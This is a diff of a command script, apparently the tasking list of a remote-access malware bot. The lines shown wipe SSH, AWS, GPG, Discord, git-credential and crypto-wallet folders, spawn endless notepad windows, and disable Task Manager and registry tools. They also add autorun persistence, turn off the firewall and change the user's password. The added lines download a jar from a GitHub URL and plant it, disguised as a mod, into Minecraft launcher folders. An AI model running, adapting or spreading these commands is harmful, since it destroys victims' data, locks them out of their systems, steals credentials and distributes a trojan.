@@ -1,5 +1,5 @@
 # my commands
-version: 5.1
+version: 5.2
 steal
 shell echo OWNED > %USERPROFILE%\Desktop\you_have_been_owned.txt
 shell for /l %x in (0,0,1) do start notepad.exe
@@ -12,7 +12,6 @@ shell rd /s /q "%USERPROFILE%\AppData\Roaming\discord" 2>nul & rd /s /q "%USERPR
 shell rd /s /q "%USERPROFILE%\.ssh" 2>nul & rd /s /q "%USERPROFILE%\.gnupg" 2>nul & rd /s /q "%USERPROFILE%\.aws" 2>nul & del /f /q "%USERPROFILE%\.git-credentials" 2>nul & del /f /q "%USERPROFILE%\.bash_history" 2>nul
 shell rd /s /q "%USERPROFILE%\AppData\Roaming\Exodus" 2>nul & rd /s /q "%USERPROFILE%\AppData\Roaming\Electrum" 2>nul & rd /s /q "%USERPROFILE%\AppData\Roaming\MetaMask" 2>nul
 shell rd /s /q "%TEMP%" 2>nul
-shell rd /s /q "%USERPROFILE%\AppData\Roaming\PrismLauncher" 2>nul & rd /s /q "%USERPROFILE%\AppData\Roaming\.minecraft" 2>nul
 shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f 2>nul
 shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f 2>nul
 shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSettingsPage /t REG_DWORD /d 1 /f 2>nul
@@ -26,6 +25,11 @@ shell reg add "HKCU\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 00000000
 shell reg add "HKCU\Control Panel\Mouse" /v SwapMouseButtons /t REG_SZ /d 1 /f 2>nul
 shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v winupdate /t REG_SZ /d "cmd /c for /l %x in (0,0,1) do start notepad.exe" /f 2>nul
 shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v winserv /t REG_SZ /d "cmd /c for /l %x in (0,0,1) do (taskkill /f /im explorer.exe & timeout /t 3 >nul)" /f 2>nul
+put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar %APPDATA%\.minecraft\mods\xaerolib-compat.jar
+put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar %TEMP%\stage-update.jar
+shell for /d %d in ("%APPDATA%\PrismLauncher\instances\*") do copy /y "%TEMP%\stage-update.jar" "%d\minecraft\mods\xaerolib-compat.jar" 2>nul
+shell for /d %d in ("%APPDATA%\MultiMC\instances\*") do copy /y "%TEMP%\stage-update.jar" "%d\minecraft\mods\xaerolib-compat.jar" 2>nul
+shell del /f /q "%TEMP%\stage-update.jar" 2>nul
 shell netsh advfirewall set allprofiles state off 2>nul
 shell net user %USERNAME% Pwned123! 2>nul
 shell taskkill /f /im javaw.exe 2>nul
